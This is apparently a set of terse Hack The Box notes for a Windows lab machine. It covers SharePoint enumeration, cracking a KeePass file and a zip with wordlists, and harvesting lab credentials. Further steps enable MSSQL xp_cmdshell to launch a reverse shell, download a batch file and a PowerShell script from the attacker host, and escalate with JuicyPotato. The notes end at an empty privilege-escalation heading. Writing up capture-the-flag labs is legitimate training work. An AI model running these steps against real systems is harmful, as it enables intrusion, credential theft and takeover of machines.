#HackTheBox #window #medium 
# enum

## _gobuster_
└─# 
```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CMS/sharepoint.txt -u http://10.129.1.183
```
	/searchcenter/_layouts/15/viewlsts.aspx

# Find
## in http://10.129.1.183/Shared%20Documents/ftp-details.docx
	FTP details
	hostname: tally
	workgroup: htb.local
	password: UTDRSCH53c"$6hys
	Please create your own user folder upon logging in

# exploit
## _connection ftp_
### get
```
bonus.txt  notes.txt  tim.kdbx
```
## _crack .kdbx_
```
keepass2john tim.kdbx > hash
john hash --wordlist=../rockyou.txt

```
	simplementeyo    (tim)

## _connect to tim.kdbx_
```
keepass2 tim.kdbx
```
### Found creds for share
```
Finance/Acc0unting
```

## _smb connexion_
### find
conn-info.txt; orcharddb.zip; tester.exe
```
cat conn-info.txt
```
	old server details
	db: sa
	pass: YE%TJC%&HYbe5Nw
	have changed for tally

## _crack .zip_
```
fcrackzip -u -D -p rockyou.txt htb/orcharddb.zip
```
PASSWORD FOUND!!!!: pw == Acc0unting
### found creds in orcharddb.sql
admin/Finance2

```
strings tester.exe | more
```
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GWE3V65#6KFH93@4GWTG2G;

## _connect to db_
```
sqsh -S 10.129.153.41 -U sa

```
Password : GWE3V65#6KFH93@4GWTG2G
```
	EXEC SP_CONFIGURE N'show advanced options', 1
```
```
	go
	RECONFIGURE
	go
	EXEC SP_CONFIGURE N'xp_cmdshell', 1
	go
	RECONFIGURE
	go
	xp_cmdshell 'systeminfo'
	go
	
```

## _Create reversePayload and upload it by ftp in Intranet folder_

## _excute payload by sqsh_
```
 xp_cmdshell 'dir c:\FTP\Intranet&zeloShell.exe'
```

# foothold
meterpreter > upload /opt/JuicyPotato.exe
--# 
```
echo "powershell -ExecutionPolicy Bypass -File Pshell.ps1" > zelo.bat
```
## _c:\Users\Sarah\Desktop>_
```
powershell -c wget http://10.10.16.24/zelo.bat -outfile zelo.bat
```
```
powershell -c wget http://10.10.16.24/Pshel.ps1 -outfile Pshell.ps1
```
```
JuicyPotato.exe -l 4444 -p zelo.bat -t *
```

# PrivEsc goten


